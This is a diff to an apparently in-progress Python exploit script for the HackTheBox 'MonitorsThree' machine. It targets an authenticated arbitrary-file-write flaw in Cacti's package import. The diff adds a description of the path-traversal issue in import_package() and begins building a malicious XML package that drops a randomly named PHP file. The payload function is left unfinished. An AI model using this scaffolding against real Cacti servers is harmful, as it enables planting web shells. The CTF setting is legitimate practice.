@@ -9,6 +9,10 @@ youtube: https://youtube.com/@declanmidd
 HackTheBox: declanmiddleton
 
 Made for MonitorsThree HTB
+
+The vulnerability is an improper input validation and arbitrary file write issue in the import_package() function within the /lib/import.php script. The function blindly trusts the filenames and content provided in a specially crafted XML data file within a compressed package (.xml.gz), and writes them to the web server's file system, potentially outside the intended directory due to lack of path traversal filtering.
+
+An attacker must be an authenticated user and have the "Import Templates" permission to exploit this vulnerability. By crafting a malicious package that includes an embedded PHP file and uploading it via the "Package Import" feature
 '''
 
 import os
@@ -58,9 +62,23 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 session = http.request('GET', cacti_url)
 
 def payload():
-    print('[*] Attempting to upload payload')
-    
-    
+    # setup malicous gzip
+    print('[*] Setting up malicous gzip')
+
+    dest_filename = ''.join(random.choices(string.ascii_lowercase, k=16)) + '.php'
+    print("[*] Creating the gzip...")
+    xmldata = """<xml>
+    <files>
+        <file>
+            <name>resource/{}</name>
+            <data>{}</data>
+            <filesignature>{}</filesignature>
+        </file>
+    </files>
+    <publickey>{}</publickey>
+    <signature></signature>
+    </xml>"""
+
     pass
 
 def check_cacti_version(session):
